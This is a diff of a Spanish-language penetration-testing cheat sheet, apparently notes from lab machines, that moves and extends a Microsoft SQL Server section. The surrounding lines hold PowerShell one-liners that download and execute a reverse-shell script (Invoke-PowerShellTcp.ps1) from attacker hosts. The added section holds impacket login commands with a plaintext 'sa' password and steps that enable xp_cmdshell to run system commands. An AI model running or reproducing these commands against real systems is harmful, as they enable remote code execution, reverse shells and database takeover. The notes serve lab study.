@@ -1448,17 +1448,6 @@ Y la que por lo que entiendo carga ya el codigo en la memoria
 powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/Invoke-PowerShellTcp.ps1')
 ```
 
-## Microsoft SQL server
-
-Para conectarse desde Kali existe un script en python de impacket
-
-```
-mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
-
-/usr/share/doc/python3-impacket/examples/mssqlclient.py  WORKGROUP/sa:GWE3V65#6KFH93@4GWTG2G@10.129.1.183
-
-
-```
 
 ### Certutil 
 
@@ -1921,6 +1910,20 @@ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1') } -Credential $cred -Computer localhost
 
+```
+
+## Microsoft SQL server
+
+Para conectarse desde Kali existe un script en python de impacket. En Microsoft SQL Server, el usuario administrador por defecto se llama "sa", que es la abreviatura de "System Administrator"
+
+```
+mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
+
+/usr/share/doc/python3-impacket/examples/mssqlclient.py  WORKGROUP/sa:GWE3V65#6KFH93@4GWTG2G@10.129.1.183
+
+xp_cmdshell whoami
+# Como soy admin pued puedo activar lal ejecucion de comandos.
+enable_xp_cmdshell
 ```
 
 
